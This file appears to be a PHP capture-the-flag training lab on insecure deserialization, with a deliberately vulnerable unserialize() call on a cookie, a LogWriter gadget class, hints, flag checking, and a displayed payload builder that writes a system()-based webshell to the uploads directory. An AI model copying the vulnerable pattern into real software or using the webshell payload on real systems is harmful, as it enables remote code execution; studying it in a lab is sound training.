<?php
// Lab R3 — Insecure Deserialization (PHP Object Injection)
// Vulnerability: unserialize() on user-controlled cookie value
require_once __DIR__ . '/includes/helpers.php';

$lab_id    = 'r3';
$flag_file = 'lab_r3.txt';

$hints = [
    1 => "The app rebuilds a PHP object from data <em>you</em> control in a cookie. What runs automatically when an object is destroyed?",
    2 => "Look for magic methods — <code>__destruct</code> runs when the object is garbage collected. The <code>LogWriter</code> class writes a file using its own properties.",
    3 => "Serialize a <code>LogWriter</code> with <code>file</code> pointing to a <code>.php</code> path in the webroot and <code>data</code> set to a PHP webshell. Encode it as base64 and set it as the <code>prefs</code> cookie.",
];

// ── Gadget class (must be defined before unserialize) ──────────────────────
class LogWriter {
    public string $file = '/tmp/rce_r3_noop.txt';
    public string $data = '';
    public function __destruct() {
        if ($this->file && $this->data) {
            file_put_contents($this->file, $this->data);
        }
    }
}

// ── Default preferences ────────────────────────────────────────────────────
$default_prefs = base64_encode(serialize(['theme' => 'dark', 'lang' => 'en']));
$cookie_val    = $_COOKIE['prefs'] ?? $default_prefs;

$prefs            = ['theme' => 'dark', 'lang' => 'en'];
$unserialize_error = null;

try {
    $decoded = base64_decode($cookie_val, true);
    if ($decoded !== false) {
        $prefs = unserialize($decoded); // DELIBERATELY VULNERABLE
        if ($prefs === false) {
            $prefs = ['theme' => 'dark', 'lang' => 'en'];
            $unserialize_error = "unserialize() returned false";
        }
    } else {
        $unserialize_error = "base64_decode() failed — invalid base64";
    }
} catch (Throwable $e) {
    $prefs = ['theme' => 'dark', 'lang' => 'en'];
    $unserialize_error = $e->getMessage();
}

// ── POST handlers ──────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reveal_hint'])) {
    reveal_hint($lab_id, (int)$_POST['reveal_hint']);
    header("Location: /rce_r3.php");
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['flag'])) {
    if (check_flag($_POST['flag'], $flag_file)) {
        mark_solved($lab_id);
    } else {
        $_SESSION[flag_error_key($lab_id)] = true;
    }
    header("Location: /rce_r3.php");
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'reset') {
    unset($_SESSION['payloads'][$lab_id]);
    header("Location: /rce_r3.php");
    exit;
}

// Log the cookie if it differs from default
if ($cookie_val !== $default_prefs) {
    log_payload($lab_id, $cookie_val, 'prefs cookie');
}

$solved         = is_solved($lab_id);
$hints_revealed = hints_revealed($lab_id);
$payload_log    = get_payload_log($lab_id);
$flag_error     = !empty($_SESSION[flag_error_key($lab_id)]);
unset($_SESSION[flag_error_key($lab_id)]);

$theme_display = is_array($prefs) ? (string)($prefs['theme'] ?? 'dark') : 'dark';
$lang_display  = is_array($prefs) ? (string)($prefs['lang']  ?? 'en')   : 'en';

$page_title = 'Lab R3 — Insecure Deserialization';
include __DIR__ . '/includes/header.php';
?>

<div class="page lab-page">

  <?php if ($solved): ?>
  <div class="solved-banner">
    <div class="solved-banner-icon">🎉</div>
    <div>
      <div class="solved-banner-text">Lab Complete!</div>
      <div class="solved-banner-sub">You exploited PHP object injection via a user-controlled cookie to achieve RCE through a gadget chain.</div>
    </div>
  </div>
  <?php endif; ?>

  <div class="lab-header">
    <div class="lab-header-info">
      <div class="lab-header-meta">
        <span class="badge badge-advanced">Advanced</span>
        <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">LAB R3</span>
        <span style="font-size:0.7rem;color:var(--text-dim)">🎤 <?= stars(5) ?> Interview · 🎯 <?= stars(4) ?> Hunt</span>
      </div>
      <h1>Insecure Deserialization</h1>
      <p class="lab-header-desc">A preferences cookie is deserialized with <code>unserialize()</code> — no class allowlist, no integrity check. A <code>LogWriter</code> gadget class with a <code>__destruct</code> magic method is in scope. Craft a malicious object to write a webshell.</p>
    </div>
    <div class="lab-header-actions">
      <a href="/rce_r3_interview.php" class="btn btn-ghost btn-sm">Interview Prep</a>
      <form method="post" style="margin:0">
        <input type="hidden" name="action" value="reset">
        <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Reset payload log?')">Reset</button>
      </form>
    </div>
  </div>

  <div class="lab-body">
    <div style="display:flex;flex-direction:column;gap:16px;">

      <!-- Simulated App: User Preferences Panel -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">User Preferences</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">Cookie: prefs</span>
        </div>
        <div class="panel-body">
          <div style="display:flex;gap:16px;flex-wrap:wrap;margin-bottom:12px;">
            <div style="flex:1;min-width:140px;background:var(--surface-2,#1e1e2e);padding:12px 16px;border-radius:8px;">
              <div style="font-size:0.7rem;color:var(--text-dim);margin-bottom:4px;">Theme</div>
              <div style="font-family:var(--font-mono);font-size:0.95rem;color:var(--primary)"><?= h($theme_display) ?></div>
            </div>
            <div style="flex:1;min-width:140px;background:var(--surface-2,#1e1e2e);padding:12px 16px;border-radius:8px;">
              <div style="font-size:0.7rem;color:var(--text-dim);margin-bottom:4px;">Language</div>
              <div style="font-family:var(--font-mono);font-size:0.95rem;color:var(--primary)"><?= h($lang_display) ?></div>
            </div>
          </div>

          <div style="font-size:0.75rem;color:var(--text-dim);margin-bottom:4px;">Current cookie value (base64)</div>
          <div class="terminal" style="word-break:break-all;font-size:0.75rem;">
            <span style="color:var(--orange)"><?= h($cookie_val) ?></span>
          </div>

          <?php if ($unserialize_error): ?>
          <div class="alert alert-error" style="margin-top:10px;font-size:0.8rem;">Deserialization error: <?= h($unserialize_error) ?></div>
          <?php endif; ?>
        </div>
      </div>

      <!-- Gadget Class -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Gadget Class in Scope</span></div>
        <div class="panel-body">
          <div class="terminal">
            <span class="comment">// LogWriter — defined in this application</span><br>
            <span style="color:var(--purple)">class</span> <span style="color:var(--primary)">LogWriter</span> {<br>
            &nbsp;&nbsp;<span style="color:var(--purple)">public string</span> <span style="color:var(--text)">$file</span> = <span style="color:var(--orange)">'/tmp/rce_r3_noop.txt'</span>;<br>
            &nbsp;&nbsp;<span style="color:var(--purple)">public string</span> <span style="color:var(--text)">$data</span> = <span style="color:var(--orange)">''</span>;<br>
            &nbsp;&nbsp;<span style="color:var(--purple)">public function</span> <span style="color:var(--red)">__destruct</span>() {<br>
            &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:var(--purple)">if</span> ($this->file && $this->data) {<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:var(--text-dim)">// writes $data to $file — attacker controls both</span><br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($this->file, $this->data);<br>
            &nbsp;&nbsp;&nbsp;&nbsp;}<br>
            &nbsp;&nbsp;}<br>
            }<br><br>
            <span class="comment">// Vulnerable deserialization</span><br>
            <span style="color:var(--text)">$cookie_val = $_COOKIE[<span style="color:var(--orange)">'prefs'</span>] ?? $default_prefs;<br>
            <span style="color:var(--red)">$prefs = unserialize(base64_decode($cookie_val));</span></span>
          </div>
        </div>
      </div>

      <!-- Payload Builder -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Payload Builder (run locally)</span></div>
        <div class="panel-body">
          <p style="font-size:0.82rem;color:var(--text-muted);margin-bottom:10px;">Run this PHP snippet on your own machine to generate the exploit cookie value:</p>
          <div class="terminal">
            <span class="comment">// payload_builder.php — run with: php payload_builder.php</span><br>
            <span style="color:var(--purple)">class</span> <span style="color:var(--primary)">LogWriter</span> {<br>
            &nbsp;&nbsp;<span style="color:var(--purple)">public string</span> <span style="color:var(--text)">$file</span>;<br>
            &nbsp;&nbsp;<span style="color:var(--purple)">public string</span> <span style="color:var(--text)">$data</span>;<br>
            }<br>
            $o = <span style="color:var(--purple)">new</span> LogWriter();<br>
            $o->file = <span style="color:var(--orange)">'/var/www/html/uploads/pwn.php'</span>;<br>
            $o->data = <span style="color:var(--orange)">'&lt;?php system($_GET["c"]); ?&gt;'</span>;<br>
            <span style="color:var(--text)">echo base64_encode(serialize($o));</span>
          </div>
          <p style="font-size:0.8rem;color:var(--text-muted);margin-top:10px;">Set the output as your <code>prefs</code> cookie, then reload the page. After the request, visit <code>/uploads/pwn.php?c=cat+/flags/lab_r3.txt</code>.</p>
        </div>
      </div>

      <!-- Objective -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Objective</span></div>
        <div class="panel-body" style="display:flex;flex-direction:column;gap:10px;font-size:0.875rem;color:var(--text-muted);">
          <div>1. Use the Payload Builder above to generate a serialized <code>LogWriter</code> object encoded as base64.</div>
          <div>2. Set it as the <code>prefs</code> cookie (DevTools → Application → Cookies, or with <code>curl --cookie</code>).</div>
          <div>3. Reload this page — <code>__destruct()</code> fires and writes your webshell to <code>/uploads/pwn.php</code>.</div>
          <div>4. Visit <code>/uploads/pwn.php?c=cat+/flags/lab_r3.txt</code> and submit the flag below.</div>
        </div>
      </div>
    </div>

    <!-- Sidebar -->
    <div style="display:flex;flex-direction:column;gap:16px;">

      <!-- Flag Submission -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Submit Flag</span></div>
        <div class="panel-body">
          <?php if ($flag_error): ?>
          <div class="alert alert-error" data-dismiss="4000">Incorrect flag. Keep hunting.</div>
          <?php endif; ?>
          <?php if ($solved): ?>
          <div class="alert alert-success">Flag accepted! Lab complete.</div>
          <?php else: ?>
          <form method="post" class="flag-form">
            <input class="flag-input" type="text" name="flag" placeholder="HUNT{...}" autocomplete="off">
            <button type="submit" class="btn btn-primary btn-full">Submit</button>
          </form>
          <?php endif; ?>
        </div>
      </div>

      <!-- Hints -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">Hints</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)"><?= count($hints_revealed) ?>/3 revealed</span>
        </div>
        <div class="panel-body">
          <div class="hints-list">
            <?php for ($i = 1; $i <= 3; $i++): ?>
            <div class="hint-item">
              <div class="hint-header">
                Hint <?= $i ?>
                <?php if (!in_array($i, $hints_revealed, true)): ?>
                <form method="post" style="margin:0">
                  <input type="hidden" name="reveal_hint" value="<?= $i ?>">
                  <button type="submit" class="btn btn-ghost btn-sm">Reveal</button>
                </form>
                <?php endif; ?>
              </div>
              <?php if (in_array($i, $hints_revealed, true)): ?>
              <div class="hint-content"><?= $hints[$i] ?></div>
              <?php endif; ?>
            </div>
            <?php endfor; ?>
          </div>
        </div>
      </div>

      <!-- Payload Log -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">Payload Log</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)"><?= count($payload_log) ?> entries</span>
        </div>
        <div class="panel-body">
          <div class="payload-log">
            <?php if ($payload_log): ?>
            <?php foreach (array_slice($payload_log, 0, 10) as $entry): ?>
            <div class="log-entry" title="Click to copy">
              <div class="log-payload"><?= h(mb_substr($entry['payload'], 0, 80)) ?></div>
              <div class="log-context"><?= h($entry['context']) ?></div>
            </div>
            <?php endforeach; ?>
            <?php else: ?>
            <div class="log-empty">No non-default cookies seen yet.</div>
            <?php endif; ?>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
